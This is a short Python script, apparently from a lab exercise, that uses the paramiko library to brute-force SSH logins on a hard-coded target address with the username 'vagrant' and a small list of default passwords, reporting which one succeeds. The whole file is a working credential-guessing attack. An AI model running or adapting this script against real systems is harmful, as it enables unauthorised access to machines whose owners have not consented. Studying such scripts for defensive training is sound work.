import paramiko
import sys

# Target information
target_ip = '192.10.20.4'
username = 'vagrant'
password_list = ['vagrant', 'admin', 'password']  # Example password list

for password in password_list:
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(target_ip, username=username, password=password)
        print(f'Success: {username}:{password}')
        client.close()
        break
    except paramiko.AuthenticationException:
        print(f'Failed: {username}:{password}')
    except Exception as e:
        print(f'Error: {e}')